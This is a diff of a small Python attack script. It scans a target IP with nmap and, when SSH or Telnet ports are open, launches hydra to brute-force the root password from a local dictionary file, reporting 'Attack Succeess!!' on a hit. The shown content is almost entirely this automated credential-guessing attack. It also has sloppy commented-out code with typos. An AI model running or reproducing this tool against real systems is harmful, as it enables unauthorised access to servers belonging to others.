@@ -30,27 +30,27 @@ def get_nmap(options, ip):
 
     return num
 
-
 def chunker(seq, size):
     return (seq[pos:pos + size] for pos in range(0, len(seq), size))
-
 
 
 def hydra(ip, port):
     command = "hydra -l root -P /root/Desktop/dic.txt"+" "+ ip+" "+ port+" -V -f -t 4"
     process = os.popen(command)
     results = str(process.read())
-    p = re.compile('')
+    
+    #for line in results:
+    #    if line.contain('1 of 1'):
+    #        pirnt(line)
+    #if results.contains("successfully")
     
     if "successfully" in results:
         print("Attack Succeess!!")
-        
-
+        ####### login password print
+        return 1
     else:
-        print("Don't find")
-
-    return results
-
+        print("Don't find ssh key in dic.txt")
+        return 0
 
 
 #print(get_nmap(' -F', '172.30.1.40'))
@@ -67,4 +67,11 @@ print(get_nmap(' -F', foo))
 if get_nmap(' -F', foo)[0]==1:
     print("SSH OPEN")
     print(hydra(foo,"ssh"))
-    
+
+#Telnet PORT OPEN
+if get_nmap(' -F', foo)[1]==1:
+    print("TELNET OPEN")
+    print(hydra(foo,"telnet"))
+
+
+
